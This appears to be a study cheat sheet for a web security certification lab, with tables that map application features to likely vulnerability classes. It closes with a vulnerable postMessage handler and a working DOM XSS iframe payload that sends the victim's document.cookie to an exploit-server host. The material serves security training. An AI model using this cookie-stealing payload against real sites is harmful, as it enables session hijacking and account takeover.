# Stage 1 - anonymous to user session
## Identify the case
| Case      | Probable exploit |
| ----------- | ----------- |
| tracking.js | Host header poisoning / Cache poisoning |
| <script>alert(1)</script> in the search | XSS |
| Post a comment | HTTP Request Smuggling |
| Different message error when resetting password | Bruteforce | 
| None of the above | Bruteforce |


# Stage 2 - user to administrator session
## Identify the case
| Case      | Probable exploit |
| ----------- | ----------- |
| Advanced search | SQL injection |
| Session cookie with "isloggedin" | CSRF |
| Request in Burp proxy when updating email with "timestamp" | CORS |
| Different message error when resetting password | Bruteforce | 
| JSON request when updating email with answer contained "id" but not in the request | IDOR |
| Able to remove the parameter csrf when updating the email | CSRF |


# Stage 3 - command execution as administrator
## Identify the case
| Case      | Probable exploit |
| ----------- | ----------- |
| Upload XML feature | XXE or XML command injection |
| Change the blog image | SSRF/Remote file inclusion |
| Right click on an image and seeing a size parameter | Command injection |
| An example of template for reset email | SSTI | 
| Download a file for report | SSRF |
| Lots of images and no size parameter | Directory traversal |


# DOM Based XSS
```
GET /

<script>
    window.addEventListener('message', function(e) {
        var img = document.createElement('img'), ACMEplayer = {element: img}, d;
        document.body.appendChild(img);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
            case "redirect":
                window.location.replace(d.redirectUrl);
                break;
        }
    }, false);
</script>
```
```
<iframe src=https://LAB.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://EXPLOIT-SERVER-URL-XX.web-securityacademy.net/?c=%22%2bdocument.cookie\"}","*")' >
```
